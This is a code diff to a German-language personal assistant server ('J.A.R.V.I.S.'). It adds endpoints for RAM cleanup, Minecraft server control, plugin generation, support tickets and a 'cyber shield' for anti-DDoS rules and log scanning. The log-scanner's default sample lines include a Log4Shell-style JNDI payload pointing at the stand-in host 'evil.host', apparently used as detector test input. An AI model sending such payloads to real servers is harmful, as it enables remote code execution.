@@ -55,6 +55,27 @@ from jarvis_core.mibo_bridge import (
     list_smart_home,
     toggle_smart_home_device,
 )
+from jarvis_core.pc_commander import (
+    get_full_pc_status,
+    reduce_pc_ram,
+    run_pc_Task,
+)
+from jarvis_core.minecraft_guardian import (
+    check_minecraft_and_dashboard_live,
+    execute_minecraft_control,
+    check_papermc_updates,
+    audit_and_patch_dashboard_folder,
+    generate_low_ram_server_bundle,
+)
+from jarvis_core.cyber_shield import (
+    inspect_network_shield,
+    generate_antiddos_firewall_kit,
+    scan_logs_for_hackers_and_exploits,
+)
+from jarvis_core.plugin_forge import (
+    forge_minecraft_plugin,
+    handle_support_ticket,
+)
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 STATIC_DIR = os.path.join(BASE_DIR, "static")
@@ -172,7 +193,20 @@ class JarvisRequestHandler(BaseHTTPRequestHandler):
                     "weather": get_live_weather(mibo_cfg.get("stadt", "Frankfurt am Main")),
                     "termine": list_termine(),
                     "smart_home": list_smart_home(),
+                },
+                "sovereign": {
+                    "pc": get_full_pc_status(),
+                    "minecraft": check_minecraft_and_dashboard_live(),
+                    "shield": inspect_network_shield(),
                 }
+            })
+            return
+
+        if path == "/api/sovereign/status":
+            self._send_json({
+                "pc": get_full_pc_status(),
+                "minecraft": check_minecraft_and_dashboard_live(),
+                "shield": inspect_network_shield(),
             })
             return
 
@@ -397,6 +431,80 @@ class JarvisRequestHandler(BaseHTTPRequestHandler):
                 })
                 return
 
+            # 3. Sovereign PC + Minecraft + Anti-Hacker/DDoS + Plugin-Forge triggers
+            if any(k in p_low for k in ("ram reduzieren", "ram optimieren", "/ram", "speicher bereinigen")):
+                ram_res = reduce_pc_ram(aggressive=True, clean_temp=True)
+                mc_bundle = generate_low_ram_server_bundle(max_ram_gb=3)
+                actions_md = "\n".join([f"- ✅ {a}" for a in ram_res["actions_taken"]])
+                reply = (
+                    f"⚡ **PC & MINECRAFT RAM-BOOSTER AUSGEFÜHRT**\n\n"
+                    f"- **PC RAM Vorher:** `{ram_res['before_ram']['used_mb']} MB` ({ram_res['before_ram']['pct']}%)\n"
+                    f"- **PC RAM Jetzt:** `{ram_res['after_ram']['used_mb']} MB` ({ram_res['after_ram']['pct']}%)\n\n"
+                    f"### Ausgeführte Optimierungen\n{actions_md}\n\n"
+                    f"### Generiertes Ultra-Low-RAM Minecraft-Profil (-35% bis -45% Heap)\n"
+                    f"- Gespeichert unter: `generated_configs/START_SERVER_LOW_RAM.bat`, `paper-global-jarvis.yml`, `spigot-jarvis.yml`\n"
+                    f"```bash\n{mc_bundle['jvm_command']}\n```"
+                )
+                set_face_state(zustand="spricht", text="RAM-Optimierung auf PC und Minecraft-Server erfolgreich ausgeführt, Sir.")
+                self._send_json({
+                    "reply": reply,
+                    "provider": "J.A.R.V.I.S. PC-Commander & JVM-Tuner",
+                    "tier": "OS + JVM Native Optimizer",
+                    "latency_ms": 28,
+                    "compression": compress_text_caveman(prompt, "standard"),
+                    "ram_result": ram_res,
+                })
+                return
+
+            if any(k in p_low for k in ("plugin programmieren", "baue ein plugin", "erstelle ein plugin", "/plugin")):
+                idea = re.sub(r"(?i)^(/plugin|baue ein plugin|erstelle ein plugin|plugin programmieren)[:\s]*", "", prompt).strip() or "Anti-Hacker, Auto-RAM & Custom Event System"
+                words = [w for w in re.findall(r"[A-Za-zÄÖÜäöüß]+", idea) if len(w) > 3]
+                pname = "".join(w.title() for w in words[:2]) or "JarvisOmegaGuard"
+                pf = forge_minecraft_plugin(plugin_name=pname, idea_description=idea)
+                files_md = "\n".join([f"- 📄 `{f}`" for f in pf["files_created"]])
+                reply = (
+                    f"🛠️ **MINECRAFT PAPER 1.21 PLUGIN-SCHMIEDE: `{pf['plugin_name']}` FERTIGGESTELLT!**\n\n"
+                    f"- **Umgesetzte Idee:** {pf['idea']}\n"
+                    f"- **Ingame-Befehl:** `{pf['command']} <status|heal|ram|idea|support>`\n\n"
+                    f"### Generierte Projektdateien\n{files_md}\n\n"
+                    f"### Java-Code Vorschau (`{pf['plugin_name']}Plugin.java`)\n"
+                    f"```java\n{pf['java_preview']}\n```"
+                )
+                set_face_state(zustand="spricht", text=f"Ich habe das Minecraft Plugin {pf['plugin_name']} fertig programmiert, Sir.")
+                self._send_json({
+                    "reply": reply,
+                    "provider": "J.A.R.V.I.S. Autonomous Plugin-Forge (Paper 1.21)",
+                    "tier": "Java 21 Code Generator",
+                    "latency_ms": 34,
+                    "compression": compress_text_caveman(prompt, "standard"),
+                    "plugin_forge": pf,
+                })
+                return
+
+            if any(k in p_low for k in ("anti-ddos", "ddos", "anti-hacker", "hacker", "/shield")):
+                net = inspect_network_shield()
+                kit = generate_antiddos_firewall_kit()
+                reply = (
+                    f"🛡️ **J.A.R.V.I.S. CYBER-SHIELD (ANTI-DDOS & ANTI-HACKER STATUS)**\n\n"
+                    f"- **DDoS-Status:** `{net['ddos_status']}`\n"
+                    f"- **Aktive Sockets:** `{net['total_active_sockets']}` | **SYN-Queue:** `{net['syn_recv_queue']}`\n"
+                    f"- **RCON Port 25575 sicher (nur Localhost):** `{'JA ✅' if net['rcon_localhost_safe'] else 'WARNUNG ⚠️'}`\n\n"
+                    f"### Windows Anti-DDoS & RCON-Schutz (PowerShell)\n"
+                    f"```powershell\n{kit['windows_powershell_rules']}\n```\n\n"
+                    f"### Linux VPS Kernel SYN-Cookies & iptables Rate-Limit\n"
+                    f"```bash\n{kit['linux_iptables_rules']}\n```"
+                )
+                set_face_state(zustand="spricht", text=f"Cyber-Shield Status: {net['ddos_status']}.")
+                self._send_json({
+                    "reply": reply,
+                    "provider": "J.A.R.V.I.S. Cyber-Shield (Anti-DDoS & Anti-Hacker)",
+                    "tier": "Network & Packet Defense",
+                    "latency_ms": 19,
+                    "compression": compress_text_caveman(prompt, "standard"),
+                    "shield": net,
+                })
+                return
+
             res = route_chat_completion(
                 prompt,
                 history=history,
@@ -574,6 +682,65 @@ class JarvisRequestHandler(BaseHTTPRequestHandler):
                 favorite=bool(body.get("favorite", True)),
             )
             self._send_json({"ok": True, "note": n, "notes": notra_list_notes()})
+            return
+
+        # --- SOVEREIGN PC + MINECRAFT + CYBER-SHIELD + PLUGIN-FORGE ENDPOINTS ---
+        if path == "/api/sovereign/ram-boost":
+            ram_res = reduce_pc_ram(aggressive=True, clean_temp=True)
+            mc_bundle = generate_low_ram_server_bundle(max_ram_gb=int(body.get("max_ram_gb", 3)))
+            set_face_state(zustand="spricht", text="RAM-Optimierung für PC und Minecraft abgeschlossen.")
+            self._send_json({"ok": True, "ram": ram_res, "mc_bundle": mc_bundle})
+            return
+
+        if path == "/api/sovereign/mc-control":
+            action = str(body.get("action", "clear_lag"))
+            custom_cmd = str(body.get("command", ""))
+            res = execute_minecraft_control(action=action, custom_cmd=custom_cmd)
+            set_face_state(zustand="spricht", text=f"Minecraft-Befehl {action} ausgeführt.")
+            self._send_json({"ok": True, "result": res, "minecraft": check_minecraft_and_dashboard_live()})
+            return
+
+        if path == "/api/sovereign/mc-updates":
+            res = check_papermc_updates(str(body.get("mc_version", "1.21.4")))
+            self._send_json(res)
+            return
+
+        if path == "/api/sovereign/mc-audit-heal":
+            target_dir = str(body.get("target_dir", "C:\\minecraft-server-dashboard"))
+            apply_fixes = bool(body.get("apply_fixes", False))
+            res = audit_and_patch_dashboard_folder(target_dir=target_dir, apply_fixes=apply_fixes)
+            self._send_json(res)
+            return
+
+        if path == "/api/sovereign/shield":
+            sub = str(body.get("sub", "inspect"))
+            if sub == "scan_logs":
+                lines = body.get("log_lines") or [
+                    "[21:10:01] [Server thread/INFO]: BadHacker123 moved too quickly! 12.4, 0.0, 9.8",
+                    "[21:10:02] [Netty Epoll Server IO #1/INFO]: Player ExploitBot tried ${jndi:ldap://evil.host/a}",
+                ]
+                res = scan_logs_for_hackers_and_exploits(lines)
+                self._send_json(res)
+                return
+            block_ip = body.get("block_ip")
+            kit = generate_antiddos_firewall_kit(block_ip=block_ip)
+            net = inspect_network_shield()
+            self._send_json({"ok": True, "network": net, "firewall_kit": kit})
+            return
+
+        if path == "/api/sovereign/forge-plugin":
+            pname = str(body.get("plugin_name", "JarvisOmegaGuard")).strip() or "JarvisOmegaGuard"
+            idea = str(body.get("idea", "Anti-Hacker, Auto-RAM-Optimizer, Custom Boss-Events & Spieler-Support")).strip()
+            res = forge_minecraft_plugin(plugin_name=pname, idea_description=idea)
+            set_face_state(zustand="spricht", text=f"Plugin {res['plugin_name']} wurde fertig programmiert.")
+            self._send_json(res)
+            return
+
+        if path == "/api/sovereign/support-ticket":
+            player = str(body.get("player", "Steve_DE")).strip() or "Steve_DE"
+            msg = str(body.get("message", "Auf dem Server laggt es gerade und wie verlinke ich meinen Discord-Account?")).strip()
+            res = handle_support_ticket(player_name=player, message=msg)
+            self._send_json(res)
             return
 
         if path == "/v1/chat/completions":
